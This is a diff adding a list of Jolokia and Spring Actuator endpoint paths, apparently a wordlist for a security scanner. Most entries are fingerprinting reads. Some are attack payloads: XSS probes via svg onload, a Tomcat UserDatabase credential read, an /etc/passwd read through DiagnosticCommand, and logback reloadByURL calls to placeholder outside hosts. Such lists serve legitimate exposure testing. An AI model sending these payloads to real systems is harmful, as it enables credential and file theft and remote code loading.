@@ -1,0 +1,32 @@
+/jolokia/list
+/jolokia/read/Users:database=UserDatabase,type=UserDatabase
+/actuator/jolokia/read/Users:database=UserDatabase,type=UserDatabase
+/jolokia/read<svg onload=alert(document.domain)>?mimeType=text/html
+/api/jolokia/read<svg onload=alert(document.domain)>?mimeType=text/html
+/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+/actuator/jolokia/list
+/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml
+/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml
+/jolokia/version
+/actuator/jolokia/version
+/jolokia/search/*:test=test
+/actuator/jolokia/search/*:test=test
+/api/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html
+/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html
+/actuator/jolokia/read/JMImplementation:type=MBeanServerDelegate/ImplementationName
+/actuator/jolokia/read/JMImplementation:type=MBeanServerDelegate/ImplementationVendor
+/actuator/jolokia/read/JMImplementation:type=MBeanServerDelegate/ImplementationVersion
+/actuator/jolokia/read/JMImplementation:type=MBeanServerDelegate/MBeanServerId
+/actuator/jolokia/read/JMImplementation:type=MBeanServerDelegate/SpecificationName
+/actuator/jolokia/read/JMImplementation:type=MBeanServerDelegate/SpecificationVendor
+/actuator/jolokia/read/JMImplementation:type=MBeanServerDelegate/SpecificationVersion
+/actuator/jolokia/read/java.lang:type=Memory
+/jolokia/read/java.lang:type=Memory
+/jolokia/read/JMImplementation:type=MBeanServerDelegate/ImplementationName
+/jolokia/read/JMImplementation:type=MBeanServerDelegate/ImplementationVendor
+/jolokia/read/JMImplementation:type=MBeanServerDelegate/ImplementationVersion
+/jolokia/read/JMImplementation:type=MBeanServerDelegate/MBeanServerId
+/jolokia/read/JMImplementation:type=MBeanServerDelegate/SpecificationName
+/jolokia/read/JMImplementation:type=MBeanServerDelegate/SpecificationVendor
+/jolokia/read/JMImplementation:type=MBeanServerDelegate/SpecificationVersion
